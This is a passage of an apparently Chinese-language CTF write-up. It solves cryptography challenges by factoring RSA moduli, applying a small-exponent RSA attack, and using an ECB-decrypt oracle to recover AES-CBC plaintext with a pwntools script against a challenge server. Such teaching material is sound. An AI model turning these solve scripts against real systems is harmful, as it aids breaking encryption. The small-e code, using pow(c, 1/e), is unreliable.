129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(633,363) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g></g><g data-mml-node="mtext" transform="translate(2755.7,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mi" transform="translate(3005.7,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3883.7,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(4368.7,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mtext" transform="translate(4888.7,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mi" transform="translate(5138.7,0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g></g></g></svg></mjx-container></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分別對應 c = c, flag = n, e = e, n = N</span><br></pre></td></tr></table></figure></div>
+<p>所以我們要利用output給的n, e, c去解密得到flag<br>也就是利用這條<br><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="13.985ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6181.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(466,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(1263.8,0)"><path data-c="2261" d="M56 444Q56 457 70 464H707Q722 456 722 444Q722 430 706 424H72Q56 429 56 444ZM56 237T56 250T70 270H707Q722 262 722 250T707 230H70Q56 237 56 250ZM56 56Q56 71 72 76H706Q722 70 722 56Q722 44 707 36H70Q56 43 56 56Z"></path></g><g data-mml-node="mn" transform="translate(2319.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2819.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3208.6,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(4086.6,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(4571.6,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mtext" transform="translate(5091.6,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mi" transform="translate(5341.6,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(5792.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container><br>我們有c跟N了(題目output給的)，所以只要把d求出來就有flag了</p>
+<ul>
+<li>求d流程:<br>  r = (p-1) * (q-1)<ol>
+<li>先把題目給的n拿去分解，得到p跟q</li>
+<li>求出r</li>
+<li>得知d為e關於r的模反元素，故求出模反元素及為d<br>可利用Crypto.Util.number中的inverse得出  <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = inverse(e, r)</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+</li>
+<li>求d<ol>
+<li><p>丟到網站得到p跟q</p>
+  <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">這個網站可以記一下，如果遇到很大的數要分解p跟q可以用用看這網站，有機率可以找到</span><br></pre></td></tr></table></figure></div>
+<p>  <a class="link" target="_blank" rel="noopener" href="http://www.factordb.com/index.php?query=7906961983747432626460011685427449111190647169309825535629493220735583689550836202522449">http://www.factordb.com/index.php?query=7906961983747432626460011685427449111190647169309825535629493220735583689550836202522449 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>  <img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkgcjxZeC.png" alt="image"></p>
+</li>
+<li><p>r = (p-1) * (q-1)</p>
+</li>
+<li><p>inverse(e, r)</p>
+</li>
+</ol>
+</li>
+</ul>
+<p>程式碼如下 : </p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">7906961983747432626460011685427449111190647169309825535629493220735583689550836202522449</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">5061370730349429183719986779984362765739704575987547712894308499558345406620474823416518</span></span><br><span class="line">p = <span class="number">88942923919478497069248398794539034790292827</span></span><br><span class="line">q = <span class="number">88899280969284710491078307117271523349979587</span></span><br><span class="line">r = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, r)</span><br><span class="line">flag = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="RSA-Advance"><a href="#RSA-Advance" class="headerlink" title="RSA_Advance"></a>RSA_Advance</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">這題題目我又出爛了，所以也可以直接用網站解ˊ_&gt;ˋ</span><br></pre></td></tr></table></figure></div>
+<p>下載後看程式碼:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(flag, e) &lt; n</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"n = <span class="subst">{n}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"e = <span class="subst">{e}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"c = <span class="subst">{c}</span>"</span>)</span><br></pre></td></tr></table></figure></div>
+<p>output : </p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = 15045495637503383076886953664154628393474382722562097530999670110312205525123675984984457845456708845774201681442538409200532681248443773083205661051124547874615024774861919511184043086702330641224929428440143704795211884788511910045989370439551141778648666746332595358813214460211124127636277094461223263529534077171016884742434937890065649394831197099347196727313714257477982860422784670578990792512560956499088115838017506486753568692666981228370059568447799605013124721946372995902592154637756547300184585775730143167385057571430079872278805985396417884391982566171376997918395451503108556043731799748076934929411</span><br><span class="line">e = 3</span><br><span class="line">c = 32310076242696966965850837974903404646338832419909244451034008853730035437438706539445594096364734279010892983105604179773988607619878002943311001333885584787402939582687464604341651283109090917</span><br></pre></td></tr></table></figure></div>
+<h4 id="解法1-2"><a href="#解法1-2" class="headerlink" title="解法1"></a>解法1</h4><p>直接丟網站解<br><a class="link" target="_blank" rel="noopener" href="https://www.dcode.fr/rsa-cipher">https://www.dcode.fr/rsa-cipher <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ry7x0eblR.png" alt="image"></p>
+<h4 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h4><p>這題的n很大，分解的話要花很多時間，且剛剛factordb網站也沒有分解過後的資料，故不能直接去分解<br>除此之外，從程式碼得知p跟q很大</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></div>
+<p>之後會發現，e很小，所以可以利用一種攻擊”small e attack”<br>原理大概是<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyDMG-bg0.jpg" alt="smallattack"><br>所以我們只要對c開e次方根就可以得到flag<br>程式碼如下:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">15045495637503383076886953664154628393474382722562097530999670110312205525123675984984457845456708845774201681442538409200532681248443773083205661051124547874615024774861919511184043086702330641224929428440143704795211884788511910045989370439551141778648666746332595358813214460211124127636277094461223263529534077171016884742434937890065649394831197099347196727313714257477982860422784670578990792512560956499088115838017506486753568692666981228370059568447799605013124721946372995902592154637756547300184585775730143167385057571430079872278805985396417884391982566171376997918395451503108556043731799748076934929411</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">32310076242696966965850837974903404646338832419909244451034008853730035437438706539445594096364734279010892983105604179773988607619878002943311001333885584787402939582687464604341651283109090917</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, <span class="number">1</span>/e)</span><br><span class="line">m = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="The-secret-message"><a href="#The-secret-message" class="headerlink" title="The secret message"></a>The secret message</h3><p>這題要了解AES中的ECB跟CBC<br>可以看這篇文章<br><a class="link" target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10336337">https://ithelp.ithome.com.tw/articles/10336337 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>且也要做過AES的題目(才看得懂python中關於AES的語法)</p>
+<p>查看程式碼:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = get_random_bytes(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_flag</span>():</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    encrypted = cipher.encrypt(flag.encode())</span><br><span class="line">    ciphertext = encrypted.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ECB_decrypt</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    decryptext = cipher.decrypt(ciphertext).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> decryptext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    message = encrypt_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"This message is encrypted, try to decrypt it!"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"iv = <span class="subst">{iv.<span class="built_in">hex</span>()}</span>"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"message = <span class="subst">{message}</span>"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Here is a tool to help you decrypt it."</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"1. ECB decrypt"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"2. Exit"</span>)</span><br><span class="line">        num = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        <span class="keyword">if</span> num == <span class="number">1</span> :</span><br><span class="line">            ciphertext = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">"enter the cipher &gt;"</span>))</span><br><span class="line">            <span class="keyword">assert</span> (<span class="built_in">len</span>(ciphertext) % <span class="number">16</span>) == <span class="number">0</span></span><br><span class="line">            decryptext = ECB_decrypt(ciphertext)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"plaintext : <span class="subst">{decryptext}</span>"</span>)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Bye~"</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>encrypt_flag()<br>利用AES_CBC mode把flag加密後回傳</li>
+<li>ECB_decrypt()<br>把拿到的字串去做ECB解密，並把解密後的結果回傳</li>
+</ul>
+<p>整體簡單來說，nc上之後，會輸出iv跟message給你(每次nc上去，iv跟message都會不一樣，因為iv跟key都是隨機生成的(第九跟第十行))，然後message經<code>encrypt_flag()</code>加密<br>還有一個工具”ECB decrypt”給你使用，可以把你輸入的內容ECB decrypt後的結果輸出<br>所以這題就是要利用ECB decrypt這個工具去解出message是啥來得到flag</p>
+<p>那要怎麼利用呢?</p>
+<p>來看一下這兩張圖<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rytrWzMlC.png" alt="Ecb_decryption"></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ECB : </span><br><span class="line">把ciphertext切割(在此切割成三組，且互相是獨立的，互不干擾)，</span><br><span class="line">分別進行AES解密，得到Plaintext，最後把這三組得到的Plaintext接起來，成功解密</span><br></pre></td></tr></table></figure></div>
+
+
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1AtmMzxR.png" alt="image"></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CBC : </span><br><span class="line">第一組</span><br><span class="line">把ciphertext1進行AES解密，跟iv做xor，得到plaintext1</span><br><span class="line">第二組</span><br><span class="line">ciphertext2進行AES解密，跟ciphertext1做xor，得到plaintext2</span><br><span class="line">第三組</span><br><span class="line">ciphertext3進行AES解密，跟ciphertext2做xor，得到plaintext3</span><br></pre></td></tr></table></figure></div>
+
+<p>我們可以觀察出</p>
+<ul>
+<li>加解密用的key是相同的，就長一樣<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key在程式碼中為全域變數，故使用相同的key</span><br></pre></td></tr></table></figure></div></li>
+<li>ECB 跟 CBC 差別只有CBC多了一個xor的動作(紅框部分為相同)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r14YCUXx0.png" alt="螢幕擷取畫面 2023-10-04 235432"></li>
+</ul>
+<p>觀察出這樣就可以輕鬆解題了!</p>
+<h4 id="解題流程"><a href="#解題流程" class="headerlink" title="解題流程"></a>解題流程</h4><ol>
+<li>把得到的message切割成cipher1、cipher2、cipher3</li>
+<li>分別利用題目的工具去做ECB decrypt，得到plaintext1_temp、plaintext2_temp、plaintext3_temp</li>
+<li>把plaintext1_temp跟iv做xor，得到plaintext1</li>
+<li>把cipher1跟plaintext2_temp做xor，得到plaintext2</li>
+<li>把cipher2跟plaintext3_temp做xor，得到plaintext3</li>
+<li>把plaintext1、2、3組合得到message</li>
+</ol>
+<p>程式碼如下:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">這題也可以人工輸入，得到數據後用python做xor，不一定要全靠程式</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ECB_decrypt</span>():</span><br><span class="line">    r = remote(<span class="string">"35.234.62.52"</span>, <span class="number">30001</span>)</span><br><span class="line">    r.recvline()</span><br><span class="line">    iv = r.recvline()[<span class="number">5</span>:].decode()</span><br><span class="line">    message = r.recvline()[<span class="number">10</span>:].decode()</span><br><span class="line">    cipher = [message[i:i+<span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), <span class="number">32</span>)]</span><br><span class="line">    plaintext_temp=[<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">        r.sendlineafter(<span class="string">b"2. Exit\n"</span>, <span class="string">b"1"</span>)</span><br><span class="line">        r.sendlineafter(<span class="string">b"&gt;"</span>, cipher[i].encode())</span><br><span class="line">        plaintext_temp[i] = r.recvline()[<span class="number">12</span>:].decode()</span><br><span class="line">    r.sendlineafter(<span class="string">b"2. Exit\n"</span>, <span class="string">b"2"</span>)</span><br><span class="line">    <span class="keyword">return</span> iv, cipher, plaintext_temp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    iv, cipher, plaintext_temp = ECB_decrypt()</span><br><span class="line">    plaintext1 = xor(<span class="built_in">bytes</span>.fromhex(plaintext_temp[<span class="number">0</span>]), <span class="built_in">bytes</span>.fromhex(iv)).decode()</span><br><span class="line">    plaintext2 = xor(<span class="built_in">bytes</span>.fromhex(cipher[<span class="number">0</span>]), <span class="built_in">bytes</span>.fromhex(plaintext_temp[<span class="number">1</span>])).decode()</span><br><span class="line">    plaintext3 = xor(<span class="built_in">bytes</span>.fromhex(cipher[<span class="number">1</span>]), <span class="built_in">bytes</span>.fromhex(plaintext_temp[<span class="number">2</span>])).decode()</span><br><span class="line">    <span class="built_in">print</span>(plaintext1+plaintext2+plaintext3)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></div>
+
